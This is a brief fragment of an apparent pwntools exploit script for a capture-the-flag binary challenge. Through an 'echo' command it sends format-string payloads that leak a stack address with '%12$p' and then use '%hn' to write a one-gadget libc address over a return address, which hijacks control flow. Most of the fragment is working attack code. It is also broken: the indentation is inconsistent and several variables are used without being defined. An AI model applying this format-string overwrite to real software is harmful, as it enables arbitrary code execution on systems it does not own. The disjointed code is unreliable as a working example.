libc = elf.libc

    r.sendlineafter("$ \x1B[0m", payload)

# gdb.attach(r)

shell("echo %12$p b")

print("stack-------------->", hex(stack))
libc_start_main = stack + 0x38

shell("echo %" + str(ogg & 0xffff) + "c%59$hn d")
